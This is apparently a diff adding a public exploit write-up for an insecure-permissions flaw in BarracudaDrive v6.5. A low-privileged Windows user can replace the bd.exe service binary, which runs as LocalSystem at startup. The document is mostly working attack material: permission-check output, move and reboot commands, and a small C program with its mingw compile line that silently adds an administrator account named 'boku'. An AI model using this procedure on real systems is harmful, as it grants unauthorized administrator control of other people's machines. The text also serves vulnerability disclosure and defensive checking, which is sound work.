@@ -1,0 +1,94 @@
+# Exploit Title: BarracudaDrive v6.5 - Insecure Folder Permissions
+# Exploit Author:  Bobby Cooke (boku) & Adeeb Shah (@hyd3sec) 
+# CVE ID: N/A
+# Date: 2020-09-01
+# Vendor Homepage: https://barracudaserver.com/
+# Software Link:   https://download.cnet.com/BarracudaDrive/3001-18506_4-10723210.html
+# Version:         v6.5
+# Tested On:       Windows 10 Pro 
+# CVSS Base Score: 8.8 | Impact Subscore: 6.0 | Exploitability Subscore: 2.0
+#     CVSS Vector: AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+#         CWE-276: Incorrect Default Permissions
+#         CWE-732: Incorrect Permission Assignment for Critical Resource
+# Vulnerability Description:
+#     Insecure Service File Permissions in bd service in Real Time Logics BarracudaDrive v6.5 
+#   allows local low-privilege attacker to escalate privileges to admin via replacing the bd.exe 
+#   file and restarting the computer where the malicious code will be executed as 'LocalSystem'
+#   on the next startup.
+
+## Insecure Folder Permission
+C:\>cacls C:\bd
+C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F
+      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F
+      BUILTIN\Users:(OI)(CI)(ID)R
+      NT AUTHORITY\Authenticated Users:(ID)C
+      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
+
+## Insecure File/Service Permission
+C:\>cacls C:\bd\bd.exe
+C:\bd\bd.exe BUILTIN\Administrators:(ID)F
+             NT AUTHORITY\SYSTEM:(ID)F
+             BUILTIN\Users:(ID)R
+             NT AUTHORITY\Authenticated Users:(ID)C
+
+C:\>sc qc bd
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: bd
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\bd\bd.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : BarracudaDrive ( bd ) service
+        DEPENDENCIES       : Tcpip
+        SERVICE_START_NAME : LocalSystem
+
+## Local Privilege Escalation Proof of Concept
+#0.  Download & install 
+
+#1.  Create low privileged user & change to the user
+## As admin
+C:\>net user lowpriv Password123! /add
+C:\>net user lowpriv | findstr /i "Membership Name" | findstr /v "Full"
+User name                    lowpriv
+Local Group Memberships      *Users
+Global Group memberships     *None
+
+#2.  Move the Service EXE to a new name
+C:\bd>whoami
+desktop\lowpriv
+C:\bd>move bd.exe bd.service.exe
+        1 file(s) moved.
+
+#3.  Create malicious binary on kali linux
+## Add Admin User C Code
+   kali# cat addAdmin.c
+     int main(void){
+     system("net user boku mypassword /add");
+     system("net localgroup Administrators boku /add");
+     WinExec("C:\\bd\\bd.service.exe",0);
+    return 0;
+    } 
+
+## Compile Code
+   kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o bd.exe
+
+#4. Transfer created 'bd.exe' to the Windows Host 
+
+#5. Move the created 'bd.exe' binary to the 'C:\bd\' Folder
+C:\bd>move C:\Users\lowpriv\Downloads\bd.exe .
+
+#6. Check that exploit admin user doesn't exit
+C:\bd>net user boku
+The user name could not be found
+
+#6. Reboot the Computer
+C:\bd>shutdown /r
+
+#7. Login & look at that new Admin
+C:\Users\lowpriv>net user boku | findstr /i "Membership Name" | findstr /v "Full"
+User name                    boku
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
